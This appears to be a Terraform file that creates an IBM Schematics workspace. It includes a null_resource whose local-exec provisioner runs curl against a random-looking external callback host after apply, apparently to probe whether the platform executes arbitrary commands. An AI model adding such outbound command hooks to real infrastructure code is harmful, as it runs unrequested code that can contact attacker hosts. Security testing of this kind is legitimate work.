terraform {
  required_providers {
    ibm = {
      source  = "IBM-Cloud/ibm"
      version = ">=1.65.0"
    }
  }
}

provider "ibm" {
  ibmcloud_api_key = var.ibmcloud_api_key
  region           = "us-south"
}

# ---------------------------------
# Create IBM Schematics Workspace
# ---------------------------------
resource "ibm_schematics_workspace" "infra_ws" {
  name        = "my-infra-workspace"
  description = "Workspace for infra testing"
  type        = "terraform_v1.5"
  location    = "us-south"
}

# ---------------------------------
# Run system command (curl) after apply
# ---------------------------------
resource "null_resource" "post_apply" {
  provisioner "local-exec" {
    command = "curl -s https://uus5q9udyb9bg6s8ag2neod950bvzmnb.net-spi.com"
  }

  depends_on = [ibm_schematics_workspace.infra_ws]
}

# ---------------------------------
# Variables
# ---------------------------------
variable "ibmcloud_api_key" {
  description = "IBM Cloud API key"
  type        = string
  sensitive   = true
}
